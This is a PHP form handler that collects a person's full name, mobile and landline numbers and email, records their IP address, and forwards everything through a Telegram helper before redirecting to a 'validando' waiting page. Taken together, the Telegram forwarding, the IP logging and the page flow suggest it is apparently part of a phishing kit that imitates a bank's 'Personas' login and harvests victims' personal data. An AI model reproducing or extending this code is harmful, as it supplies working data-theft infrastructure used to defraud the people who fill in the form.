<?php
require_once __DIR__ . '/../php_config/helpers.php';
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: ../personas.html');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../formReg-exectution.php');
    exit;
}

$nombre = trim($_POST['fullName'] ?? '');
$telefono_movil = trim($_POST['mobile'] ?? '');
$telefono_fijo = trim($_POST['phone'] ?? '');
$email = trim($_POST['email'] ?? '');

$errores = [];

if ($nombre === '') {
    $errores['fullName'] = 'Este campo es obligatorio.';
} elseif (!preg_match('/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]{2,100}$/u', $nombre)) {
    $errores['fullName'] = 'Ingresa un nombre válido (solo letras).';
}

if ($telefono_movil === '') {
    $errores['mobile'] = 'Este campo es obligatorio.';
} elseif (!preg_match('/^[0-9]{10}$/', $telefono_movil)) {
    $errores['mobile'] = 'Ingresa un teléfono móvil de 10 dígitos.';
}

if ($telefono_fijo !== '' && !preg_match('/^[0-9]{10}$/', $telefono_fijo)) {
    $errores['phone'] = 'Ingresa un teléfono fijo de 10 dígitos.';
}

if ($email === '') {
    $errores['email'] = 'Este campo es obligatorio.';
} elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $errores['email'] = 'Ingresa un correo electrónico válido.';
}

if (!empty($errores)) {
    $_SESSION['form_errors'] = $errores;
    $_SESSION['form_old'] = [
        'fullName' => $nombre,
        'mobile' => $telefono_movil,
        'phone' => $telefono_fijo,
        'email' => $email,
    ];
    header('Location: ../formReg-exectution.php');
    exit;
}

try {
    $pdo = conectarBD();

    $ip_real = $_SESSION['ip_real'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

    $stmt = $pdo->prepare("UPDATE usuarios SET nombre = ?, telefono_movil = ?, telefono_fijo = ?, email = ?, ip_real = ? WHERE id = ?");
    $stmt->execute([$nombre, $telefono_movil, $telefono_fijo, $email, $ip_real, $_SESSION['usuario_id']]);

    require_once __DIR__ . '/../telegram/telegram-full_info.php';
    telegram_full_info_desde_usuario($pdo, (int) $_SESSION['usuario_id'], [
        'nombre' => $nombre,
        'telefono_fijo' => $telefono_fijo,
        'telefono_movil' => $telefono_movil,
        'email' => $email,
    ], 'Personas');

    unset($_SESSION['form_errors'], $_SESSION['form_old']);

    header('Location: ../validando-exection_espera.php');
    exit;
} catch (PDOException $e) {
    $_SESSION['form_errors'] = ['_general' => 'No pudimos procesar tu solicitud. Intenta de nuevo.'];
    $_SESSION['form_old'] = [
        'fullName' => $nombre,
        'mobile' => $telefono_movil,
        'phone' => $telefono_fijo,
        'email' => $email,
    ];
    header('Location: ../formReg-exectution.php');
    exit;
}
